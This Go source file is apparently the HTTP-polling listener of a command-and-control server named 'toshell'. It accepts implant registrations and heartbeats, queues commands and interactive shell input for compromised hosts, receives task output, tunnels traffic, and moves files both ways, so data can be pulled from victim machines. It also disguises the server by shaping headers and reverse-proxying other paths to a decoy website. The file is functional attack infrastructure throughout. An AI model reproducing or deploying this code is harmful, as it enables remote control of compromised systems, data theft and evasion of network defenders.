package listener

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/mimicry"
	"toshell/internal/server/session"
)

// HTTPListener 实现基于 HTTP 轮询的 C2 通道
// Implant 通过 HTTP POST 注册/心跳/提交结果，通过 HTTP GET 拉取任务
type HTTPListener struct {
	server        *http.Server
	sessionMgr    *session.Manager
	taskMgr       TaskManager
	encryptor     *crypto.Encryptor
	cfg           *config.ListenerConfig
	stopChan      chan struct{}
	stopOnce      sync.Once
	heartbeatTimeout time.Duration
	shellControl  map[string]*shellSession
	shellMu       sync.RWMutex
	onTaskResult    TaskEventCallback
	onSessionDead   func(sessionID string)
	onSessionOnline func(info *types.SessionInfo)
	mimicryMu       sync.RWMutex
	mimicry         *mimicry.Profile // 流量拟态模板：整形响应头 + 根路径诱饵（支持热更新）
	// downQueue 下行帧队列（sessionID → 已加密帧列表）：HTTP 轮询模式下
	// 服务端无法主动推送，shell 指令 / 隧道 / 文件上传指令在此排队，
	// 植入端下次心跳时批量取走。
	downMu    sync.Mutex
	downQueue map[string][][]byte
}

type shellSession struct {
	stopChan chan struct{}
}

// NewHTTPListener 创建 HTTP 轮询监听器
func NewHTTPListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr TaskManager) (*HTTPListener, error) {
	key := []byte(cfg.EncryptionKey)
	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create encryptor: %w", err)
	}

	timeout := cfg.HeartbeatTimeout
	if timeout == 0 {
		timeout = 60 * time.Second
	}

	return &HTTPListener{
		sessionMgr:   sessMgr,
		taskMgr:      taskMgr,
		encryptor:    enc,
		cfg:          cfg,
		stopChan:     make(chan struct{}),
		heartbeatTimeout: timeout,
		shellControl: make(map[string]*shellSession),
		mimicry:      mimicry.ByName(cfg.MimicryProfile),
		downQueue:    make(map[string][][]byte),
	}, nil
}

// queueDown 把一帧加密后加入会话的下行队列（HTTP 轮询模式的服务端→植入端通道）。
func (l *HTTPListener) queueDown(sessionID string, packet *protocol.Packet) error {
	data := encodePacket(packet)
	compressed, _ := compress(data)
	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return err
	}
	l.downMu.Lock()
	defer l.downMu.Unlock()
	q := l.downQueue[sessionID]
	if len(q) >= 512 {
		return fmt.Errorf("down queue full for session %s", sessionID)
	}
	l.downQueue[sessionID] = append(q, encrypted)
	return nil
}

// popDown 弹出会话下行队列中的帧（每次最多 maxFrames 帧 / maxBytes 字节）。
func (l *HTTPListener) popDown(sessionID string, maxFrames, maxBytes int) []string {
	l.downMu.Lock()
	defer l.downMu.Unlock()
	q := l.downQueue[sessionID]
	if len(q) == 0 {
		return nil
	}
	n := len(q)
	if n > maxFrames {
		n = maxFrames
	}
	var out []string
	total := 0
	for i := 0; i < n && total < maxBytes; i++ {
		out = append(out, base64.StdEncoding.EncodeToString(q[i]))
		total += len(q[i])
	}
	l.downQueue[sessionID] = q[n:]
	if len(q) == n {
		delete(l.downQueue, sessionID)
	}
	return out
}

// SetOnTaskResult sets a callback that will be invoked when a task result is received from implant.
func (l *HTTPListener) SetOnTaskResult(cb TaskEventCallback) {
	l.onTaskResult = cb
}

// SetOnSessionDead 设置 session 断连时的回调函数
func (l *HTTPListener) SetOnSessionDead(cb func(sessionID string)) {
	l.onSessionDead = cb
}

// SetOnSessionOnline 设置 session 上线时的回调函数
func (l *HTTPListener) SetOnSessionOnline(cb func(info *types.SessionInfo)) {
	l.onSessionOnline = cb
}

// getMimicry 返回当前拟态模板（加锁读取，支持运行时热更新）。
func (l *HTTPListener) getMimicry() *mimicry.Profile {
	l.mimicryMu.RLock()
	defer l.mimicryMu.RUnlock()
	if l.mimicry == nil {
		return mimicry.Default()
	}
	return l.mimicry
}

// UpdateMimicry 运行时切换流量拟态模板（配置热更新时由服务器调用）。
func (l *HTTPListener) UpdateMimicry(name string) {
	l.mimicryMu.Lock()
	l.mimicry = mimicry.ByName(name)
	l.mimicryMu.Unlock()
}

func (l *HTTPListener) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/register", l.handleRegisterHTTP)
	mux.HandleFunc("/heartbeat", l.handleHeartbeatHTTP)
	mux.HandleFunc("/task", l.handleTaskHTTP)
	mux.HandleFunc("/result", l.handleResultHTTP)
	mux.HandleFunc("/tunnel", l.handleTunnelHTTP)
	mux.HandleFunc("/shell", l.handleShellHTTP)
	mux.HandleFunc("/file", l.handleFileHTTP)
	mux.HandleFunc("/file/pull", l.handleFilePullHTTP)
	// 根路径兜底：所有非 C2 路径的探测请求返回拟态内容。
	// 配置了 mimicry_site 时反向代理到目标网站（与真实站一致）；
	// 否则返回静态拟态模板。每次请求取当前配置，支持运行时热更新。
	mux.HandleFunc("/", l.rootHandler)

	host := l.cfg.Host
	if host == "" {
		host = "0.0.0.0"
	}
	addr := fmt.Sprintf("%s:%d", host, l.cfg.Port)

	// 同步绑定端口：bind 失败（端口占用等）立即返回错误，
	// 而不是在 goroutine 里静默失败（否则 API 层会误报"已启动"）。
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}

	l.server = &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	scheme := "http"
	if l.cfg.TLSEnabled && l.cfg.CertFile != "" && l.cfg.KeyFile != "" {
		scheme = "https"
		cert, cerr := tls.LoadX509KeyPair(l.cfg.CertFile, l.cfg.KeyFile)
		if cerr != nil {
			ln.Close()
			return fmt.Errorf("failed to load TLS cert: %w", cerr)
		}
		ln = tls.NewListener(ln, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		})
	}
	fmt.Printf("[INFO] [http-listener] HTTP polling listener started on %s://%s (mimicry=%s)\n", scheme, addr, l.cfg.MimicryProfile)

	go func() {
		err := l.server.Serve(ln)
		if err != nil && err != http.ErrServerClosed {
			fmt.Printf("[ERROR] [http-listener] %v\n", err)
		}
	}()

	// 心跳判死（对齐 TCP/WS 监听器）：HTTP 轮询会话断连后若无心跳，
	// 由 checker 定期扫描标记 dead 并触发 onSessionDead，回收僵尸会话。
	// 此前缺失导致 HTTP 会话失联后永久残留 active。
	go l.heartbeatChecker()

	return nil
}

// heartbeatChecker 周期性检查会话心跳超时，标记 dead 并触发 onSessionDead。
// 与 TCP/WS 监听器共用判死策略：超过 heartbeatTimeout 未心跳 → dead。
func (l *HTTPListener) heartbeatChecker() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-l.stopChan:
			return
		case <-ticker.C:
			l.checkHeartbeats()
		}
	}
}

func (l *HTTPListener) checkHeartbeats() {
	sessions := l.sessionMgr.List()
	now := time.Now()
	for _, sess := range sessions {
		if sess == nil || sess.Info == nil {
			continue
		}
		if sess.Info.Status == "dead" {
			continue
		}
		if now.Sub(sess.LastSeen) > l.heartbeatTimeout {
			fmt.Printf("[INFO] [http-listener] Session %s timed out (last seen: %v ago)\n",
				sess.Info.ID, now.Sub(sess.LastSeen).Round(time.Second))
			sess.Info.Status = "dead"
			l.sessionMgr.ClearConnection(sess.Info.ID)
			if l.onSessionDead != nil {
				l.onSessionDead(sess.Info.ID)
			}
		}
	}
}

func (l *HTTPListener) Stop() {
	l.stopOnce.Do(func() {
		close(l.stopChan)
		if l.server != nil {
			l.server.Close()
		}
	})
}

// ─── 根路径兜底（静态拟态 / 指定网站反向代理）──────────────────────────

var (
	siteProxyMu sync.Mutex
	siteProxies = map[string]*httputil.ReverseProxy{}
)

// rootHandler 非 C2 路径统一入口：mimicry_site 配置时反向代理目标站，
// 否则返回静态拟态模板。
func (l *HTTPListener) rootHandler(w http.ResponseWriter, r *http.Request) {
	site := strings.TrimSpace(l.cfg.MimicrySite)
	if site != "" {
		l.siteProxy(w, r, site)
		return
	}
	l.getMimicry().DecoyHandler().ServeHTTP(w, r)
}

// siteProxy 把请求反向代理到伪装目标站，使监听器看起来与目标站完全一致。
// 代理实例按 URL 缓存；回源失败时回退静态诱饵，避免暴露。
func (l *HTTPListener) siteProxy(w http.ResponseWriter, r *http.Request, site string) {
	target, err := url.Parse(site)
	if err != nil || (target.Scheme != "http" && target.Scheme != "https") {
		l.getMimicry().DecoyHandler().ServeHTTP(w, r)
		return
	}

	siteProxyMu.Lock()
	p, ok := siteProxies[site]
	if !ok {
		p = httputil.NewSingleHostReverseProxy(target)
		p.ErrorHandler = func(w http.ResponseWriter, r *http.Request, _ error) {
			l.getMimicry().DecoyHandler().ServeHTTP(w, r)
		}
		siteProxies[site] = p
	}
	siteProxyMu.Unlock()

	r.Host = target.Host
	p.ServeHTTP(w, r)
}

// ─── HTTP Handlers ────────────────────────────────────────────────────────────

func (l *HTTPListener) handleRegisterHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	decompressed, _ := decompressData(decrypted)

	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	var reg protocol.Register
	if err := json.Unmarshal(packet.Payload, &reg); err != nil {
		http.Error(w, "Invalid register data", http.StatusBadRequest)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)
	sess := buildSessionInfo(packet, reg, "http", l.cfg.ID, r.RemoteAddr)

	if err := l.sessionMgr.Add(sess); err != nil {
		l.sessionMgr.Update(sessionID, sess)
	} else if l.onSessionOnline != nil {
		// 新会话上线：触发 webhook 通知
		l.onSessionOnline(sess)
	}

	fmt.Printf("[INFO] [http-listener] Implant registered: %s (%s@%s)\n", sessionID, reg.Username, reg.Hostname)

	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(fmt.Sprintf(`{"status":"registered","session_id":"%s"}`, sessionID)),
	}

	resp := encodePacket(ack)
	compressed, _ := compress(resp)
	encrypted, _ := l.encryptor.Encrypt(compressed)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}

func (l *HTTPListener) handleHeartbeatHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)

	// 更新心跳
	if sess, err := l.sessionMgr.Get(sessionID); err == nil && sess != nil {
		now := time.Now()
		sess.LastSeen = now
		sess.Info.LastSeen = now
	}

	// 会话热迁移（重连续传）：轮询通道重连后，把超过心跳超时仍无结果的
	// sent 任务重新入队，随本次心跳批量下发（断连导致结果丢失的重试）。
	if l.taskMgr != nil {
		l.taskMgr.RequeueSent(sessionID, l.heartbeatTimeout)
	}

	// 携带待执行任务（批量：HTTP 心跳间隔较长，一次下发所有积压任务，
	// 避免多任务排队数分钟才执行，表现为"功能无响应"）
	tasks := l.taskMgr.GetNextBatch(sessionID, 16)

	// 会话热迁移（重连续传）：file_download 断点续传 —— 服务端已有部分分块
	// 时，在任务 Data 注入 resume 信息（transfer_id + offset），植入端从
	// 断点继续发送剩余分块，而非全量重传。
	if len(tasks) > 0 && l.taskMgr != nil {
		for _, t := range tasks {
			if t.TaskType != "file_download" {
				continue
			}
			if st, ok := l.taskMgr.GetTransfer(t.ID); ok && st.Received > 0 && st.Received < st.Size {
				resume, _ := json.Marshal(map[string]interface{}{
					"resume":      true,
					"transfer_id": st.TransferID,
					"offset":      st.Received,
				})
				t.Data = string(resume)
				logging.Info("listener", "Hot-migrate: HTTP resume file download task %d at offset %d (transfer %s)", t.ID, st.Received, st.TransferID)
			}
		}
	}

	// 组装响应：任务列表（如有）+ 下行帧（shell/隧道/文件指令）
	respObj := map[string]interface{}{"status": "ok", "has_task": false}
	if len(tasks) > 0 {
		respObj["has_task"] = true
		// 兼容单任务字段（旧版植入端）
		if len(tasks) == 1 {
			respObj["task"] = protocol.Task{
				ID:       tasks[0].ID,
				TaskType: tasks[0].TaskType,
				Command:  tasks[0].Command,
				Args:     tasks[0].Args,
				Timeout:  tasks[0].Timeout,
				Path:     tasks[0].Path,
				PID:      tasks[0].PID,
				Data:     tasks[0].Data,
			}
		}
		// 多任务数组（新版植入端逐个执行）
		taskList := make([]protocol.Task, 0, len(tasks))
		for _, t := range tasks {
			taskList = append(taskList, protocol.Task{
				ID:       t.ID,
				TaskType: t.TaskType,
				Command:  t.Command,
				Args:     t.Args,
				Timeout:  t.Timeout,
				Path:     t.Path,
				PID:      t.PID,
				Data:     t.Data,
			})
		}
		respObj["tasks"] = taskList
	}
	if down := l.popDown(sessionID, 128, 1<<20); len(down) > 0 {
		respObj["down"] = down
	}
	responsePayload, _ := json.Marshal(respObj)

	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   responsePayload,
	}

	resp := encodePacket(ack)
	compressed, _ := compress(resp)
	encrypted, _ := l.encryptor.Encrypt(compressed)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}

func (l *HTTPListener) handleTaskHTTP(w http.ResponseWriter, r *http.Request) {
	// GET: implant 拉取待执行任务
	if r.Method == http.MethodGet {
		if l.mimicry != nil {
			l.mimicry.Shape(w)
		}
		sessionID := r.URL.Query().Get("session_id")
		if sessionID == "" {
			http.Error(w, "Missing session_id", http.StatusBadRequest)
			return
		}

		task, err := l.taskMgr.GetNext(sessionID)
		if err != nil || task == nil {
			resp := &protocol.Packet{
				Magic:     [4]byte{'T', 'S', 'H', 'L'},
				Version:   protocol.Version,
				Type:      protocol.TypeAck,
				Timestamp: uint64(time.Now().UnixMilli()),
				Payload:   []byte(`{"has_task":false}`),
			}
			data := encodePacket(resp)
			compressed, _ := compress(data)
			encrypted, _ := l.encryptor.Encrypt(compressed)
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(encrypted)
			return
		}

		taskPayload, _ := json.Marshal(protocol.Task{
			ID:       task.ID,
			TaskType: task.TaskType,
			Command:  task.Command,
			Args:     task.Args,
			Timeout:  task.Timeout,
			Path:     task.Path,
			PID:      task.PID,
			Data:     task.Data,
		})

		resp := &protocol.Packet{
			Magic:     [4]byte{'T', 'S', 'H', 'L'},
			Version:   protocol.Version,
			Type:      protocol.TypeTask,
			Timestamp: uint64(time.Now().UnixMilli()),
			Payload:   taskPayload,
		}
		data := encodePacket(resp)
		compressed, _ := compress(data)
		encrypted, _ := l.encryptor.Encrypt(compressed)

		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(encrypted)
		return
	}

	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func (l *HTTPListener) handleResultHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)
	if sess, err := l.sessionMgr.Get(sessionID); err == nil && sess != nil {
		sess.LastSeen = time.Now()
	}

	var result protocol.Result
	if err := json.Unmarshal(packet.Payload, &result); err != nil {
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}

	fmt.Printf("[INFO] [http-listener] Task %d completed: exit=%d\n", result.TaskID, result.ExitCode)
	if l.taskMgr != nil {
		if result.ExitCode == 0 && result.Error == "" {
			l.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error)
		} else {
			errMsg := result.Error
			if errMsg == "" && result.ExitCode != 0 {
				errMsg = fmt.Sprintf("exit code %d", result.ExitCode)
			}
			l.taskMgr.Fail(result.TaskID, errMsg)
		}
	}

	// Notify via callback (WebSocket broadcast to frontend)
	if l.onTaskResult != nil {
		taskType := result.TaskType
		if taskType == "" {
			if ti, tiErr := l.taskMgr.Get(result.TaskID); tiErr == nil && ti != nil {
				taskType = ti.TaskType
			}
		}
		eventType := "task_completed"
		if result.Error != "" || result.ExitCode != 0 {
			eventType = "task_failed"
		}
		l.onTaskResult(eventType, result.TaskID, sessionID, taskType, result.ExitCode, result.Output, result.Error)
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

func (l *HTTPListener) handleTunnelHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)
	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil || sess == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	sess.LastSeen = time.Now()

	if len(packet.Payload) >= 4 {
		dataLen := binary.BigEndian.Uint32(packet.Payload[:4])
		if len(packet.Payload) >= 4+int(dataLen) {
			tunnelData := packet.Payload[4 : 4+int(dataLen)]
			tunnelPacket := parseTunnelData(tunnelData)
			if tunnelPacket != nil {
				sess.DispatchTunnelData(tunnelPacket)
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

func (l *HTTPListener) handleShellHTTP(w http.ResponseWriter, r *http.Request) {
	// shell 数据通过 POST 传递
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)
	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil || sess == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	sess.LastSeen = time.Now()

	// 处理 shell 数据包
	if packet.Type == protocol.TypeShellData {
		var shellData struct {
			Data string `json:"data"`
			CWD  string `json:"cwd"`
		}
		if err := json.Unmarshal(packet.Payload, &shellData); err == nil {
			sess.DispatchShellOutput([]byte(shellData.Data))
			if shellData.CWD != "" {
				sess.SetShellCWD(shellData.CWD)
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

// ─── TaskPusher 接口实现 ────────────────────────────────────────────────────────

func (l *HTTPListener) PushTask(sessionID string, taskInfo *types.TaskInfo) error {
	fmt.Printf("[INFO] [http-listener] Task %d queued for session %s (will be polled)\n", taskInfo.ID, sessionID)
	return nil // 任务已存储在 taskMgr，implant 下次轮询时会拉取
}

// PushFileUpload HTTP 轮询模式：前端上传 API 已把文件分片落盘
// data/uploads/<sessionID>/<uploadID>，这里仅入队"上传指令"帧，
// 植入端收到后按 offset 轮询拉取并写入目标路径。
func (l *HTTPListener) PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error {
	staged := filepath.Join("data", "uploads", sessionID, uploadID)
	if _, err := os.Stat(staged); err != nil {
		return fmt.Errorf("staged upload file not found: %v", err)
	}
	payload, _ := json.Marshal(map[string]interface{}{
		"upload_id": uploadID,
		"task_id":   taskID,
		"filename":  filename,
		"path":      targetPath,
		"size":      size,
	})
	return l.queueDown(sessionID, &protocol.Packet{Type: protocol.TypeFileUpload, Payload: payload})
}

// SendTunnelRaw HTTP 轮询模式：隧道下行帧入队，植入端下次心跳取走。
func (l *HTTPListener) SendTunnelRaw(sessionID string, rawPacket []byte) error {
	return l.queueDown(sessionID, &protocol.Packet{Type: protocol.TypeTunnel, Payload: rawPacket})
}

func (l *HTTPListener) SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error {
	return l.SendTunnelRaw(sessionID, tunnel.EncodeTunnelPacket(tunnelPacket))
}

// ListRelayNodes HTTP 轮询模式不支持中继节点跟踪，返回空。
func (l *HTTPListener) ListRelayNodes() []types.RelayNode {
	return []types.RelayNode{}
}

// ─── ShellController 接口实现 ────────────────────────────────────────────────────

func (l *HTTPListener) OpenShell(sessionID string, shell string) error {
	payload, _ := json.Marshal(map[string]string{"shell": shell, "action": "open"})
	return l.queueTask(sessionID, protocol.TypeShellOpen, payload)
}

func (l *HTTPListener) SendShellInput(sessionID string, data string) error {
	payload, _ := json.Marshal(map[string]string{"data": data, "action": "input"})
	return l.queueTask(sessionID, protocol.TypeShellData, payload)
}

func (l *HTTPListener) CloseShell(sessionID string) error {
	payload, _ := json.Marshal(map[string]string{"action": "close"})
	return l.queueTask(sessionID, protocol.TypeShellClose, payload)
}

func (l *HTTPListener) queueTask(sessionID string, pType byte, payload []byte) error {
	return l.queueDown(sessionID, &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      pType,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	})
}

func parseTunnelData(data []byte) *tunnel.TunnelPacket {
	if len(data) < 5 {
		return nil
	}
	return &tunnel.TunnelPacket{
		Type:     data[0],
		TunnelID: binary.BigEndian.Uint32(data[1:5]),
		Data:     data[5:],
	}
}

// ─── HTTP 通道文件传输 ─────────────────────────────────────────────────────────

// handleFileHTTP 接收植入端上报的文件分片（目标机 → 服务器下载），
// 落盘 data/transfers/<sessionID>/<transferID>，与 TCP 通道行为一致。
func (l *HTTPListener) handleFileHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sid := fmt.Sprintf("%x", packet.ID)
	if sess, e := l.sessionMgr.Get(sid); e == nil && sess != nil {
		sess.LastSeen = time.Now()
	}

	var chunk fileDownChunk
	if err := json.Unmarshal(packet.Payload, &chunk); err != nil {
		http.Error(w, "Invalid chunk", http.StatusBadRequest)
		return
	}

	if _, err := processFileDownChunk(sid, chunk); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 断点状态挂全局 task.Manager（重连续传）
	if l.taskMgr != nil && chunk.TaskID > 0 {
		if chunk.Done {
			l.taskMgr.ClearTransfer(chunk.TaskID)
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, 100)
		} else if n, ok := decodedLen(chunk.Data); ok {
			l.taskMgr.TrackTransfer(chunk.TaskID, chunk.TransferID, chunk.Size, chunk.Offset+int64(n))
			if chunk.Size > 0 {
				pct := int((chunk.Offset + int64(n)) * 100 / chunk.Size)
				if pct > 99 {
					pct = 99
				}
				_ = l.taskMgr.UpdateProgress(chunk.TaskID, pct)
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

// handleFilePullHTTP 响应植入端的文件拉取请求（服务器 → 目标机上传方向）：
// 从 data/uploads/<sessionID>/<uploadID> 读取分片返回，植入端写入目标路径。
func (l *HTTPListener) handleFilePullHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if l.getMimicry() != nil {
		l.getMimicry().Shape(w)
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	decrypted, err := l.encryptor.Decrypt(body)
	if err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	decompressed, _ := decompressData(decrypted)
	packet, err := parsePacket(decompressed)
	if err != nil || packet == nil {
		http.Error(w, "Invalid packet", http.StatusBadRequest)
		return
	}

	sid := fmt.Sprintf("%x", packet.ID)
	var req struct {
		UploadID string `json:"upload_id"`
		Offset   int64  `json:"offset"`
		Length   int64  `json:"length"`
	}
	if err := json.Unmarshal(packet.Payload, &req); err != nil || req.UploadID == "" {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if strings.ContainsAny(req.UploadID, "/\\:") {
		http.Error(w, "invalid upload_id", http.StatusBadRequest)
		return
	}
	if req.Length <= 0 || req.Length > 4*1024*1024 {
		req.Length = 256 * 1024
	}

	staged := filepath.Join("data", "uploads", sid, req.UploadID)
	f, err := os.Open(staged)
	if err != nil {
		http.Error(w, "staged file not found", http.StatusNotFound)
		return
	}
	defer f.Close()
	if _, err := f.Seek(req.Offset, io.SeekStart); err != nil {
		http.Error(w, "seek failed", http.StatusInternalServerError)
		return
	}
	buf := make([]byte, req.Length)
	n, _ := io.ReadFull(f, buf)
	if n <= 0 {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data":""}`))
		return
	}
	buf = buf[:n]

	// 响应封装为加密帧
	resp := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(fmt.Sprintf(`{"data":%q}`, base64.StdEncoding.EncodeToString(buf))),
	}
	data := encodePacket(resp)
	compressed, _ := compress(data)
	encrypted, _ := l.encryptor.Encrypt(compressed)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}
